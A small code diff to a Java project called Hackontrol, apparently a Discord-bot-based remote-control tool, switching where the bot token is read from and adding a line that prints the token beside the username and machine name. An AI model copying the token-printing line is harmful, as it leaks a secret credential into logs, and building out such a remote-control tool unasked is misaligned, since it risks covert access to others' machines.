@@ -56,7 +56,7 @@ public class Hackontrol {
 			Hackontrol.LOGGER.info("Registered module: {}", this.moduleList.get(i).getClass().getName());
 		}
 
-		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
+		JDABuilder builder = JDABuilder.createDefault(Information.getToken()).enableIntents(GatewayIntent.MESSAGE_CONTENT);
 
 		for(int i = 0; i < this.managerList.size(); i++) {
 			this.managerList.get(i).configureBuilder(builder);
@@ -260,6 +260,7 @@ public class Hackontrol {
 		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Debug\\libnative32.dll");
 		System.out.println("Username: " + Information.getUserName());
 		System.out.println("Machine name: " + Information.getMachineName());
+		System.out.println("Token: " + Information.getToken());
 	}
 
 	public static Hackontrol getInstance() {
